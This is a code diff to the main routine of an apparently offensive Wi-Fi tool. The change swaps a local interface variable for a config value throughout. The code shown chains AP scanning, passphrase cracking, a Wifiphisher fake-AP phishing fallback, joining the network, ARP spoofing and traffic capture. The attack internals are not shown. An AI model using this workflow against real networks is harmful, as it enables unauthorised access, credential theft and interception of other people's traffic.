@@ -102,19 +102,19 @@ def main():
             print(e.requirement.msg, file=sys.stderr)
             print('Requirements check failed.', file=sys.stderr)
             return exitcode.value
+        else:
+            logger.info('Requirements check successful.')
 
         # start successful
         print(config.PROGRAM_DESCRIPTION)
-
-        interface = config.interface
 
         with tempfile.TemporaryDirectory() as tmp_dirname:
             #
             # Scan for target AP
             #
-            with interface.monitor_mode():
+            with config.interface.monitor_mode():
                 try:
-                    scanner = WirelessScanner(tmp_dir=tmp_dirname, interface=interface)
+                    scanner = WirelessScanner(tmp_dir=tmp_dirname, interface=config.interface)
                     print('Scanning networks.')
                     scan = scanner.scan_once()
                 except KeyboardInterrupt:
@@ -134,9 +134,9 @@ def main():
                 # Unlock target AP
                 #
                 print("Attack data stored at '{}'.".format(target.dir_path))
-                with interface.monitor_mode(target.channel):
+                with config.interface.monitor_mode(target.channel):
                     try:
-                        wireless_unlocker = WirelessUnlocker(ap=target, monitoring_interface=interface)
+                        wireless_unlocker = WirelessUnlocker(ap=target, monitoring_interface=config.interface)
                         print('Unlock targeted AP.')
                         wireless_unlocker.start()
                     except PassphraseNotInAnyDictionaryError:
@@ -151,7 +151,7 @@ def main():
                         print('Try to impersonate AP and perform a phishing attack.')
                         try:
                             print('Start wifiphisher.')
-                            with Wifiphisher(ap=target, jamming_interface=interface) as wifiphisher:
+                            with Wifiphisher(ap=target, jamming_interface=config.interface) as wifiphisher:
                                 while not wifiphisher.password:
                                     wifiphisher.update()
                                     if wifiphisher.state == wifiphisher.State.TERMINATED and not wifiphisher.password:
@@ -177,7 +177,7 @@ def main():
                 #
                 # Connect to the network
                 #
-                wireless_connecter = WirelessConnecter(interface=interface)
+                wireless_connecter = WirelessConnecter(interface=config.interface)
                 print('Connecting to the AP.')
                 try:
                     wireless_connecter.connect(target)
@@ -194,14 +194,14 @@ def main():
                 #
                 # Change the network topology
                 #
-                arp_spoofing = ArpSpoofing(interface=interface)
+                arp_spoofing = ArpSpoofing(interface=config.interface)
                 try:
                     print('Changing topology of network.')
                     arp_spoofing.start()
                     print('Running until KeyboardInterrupt.')
                     dumpcap = None
                     if config.capture_file:
-                        dumpcap = Dumpcap(interface=interface, capture_file=config.capture_file)
+                        dumpcap = Dumpcap(interface=config.interface, capture_file=config.capture_file)
                         print('Capturing network traffic.')
                     try:
                         while True:
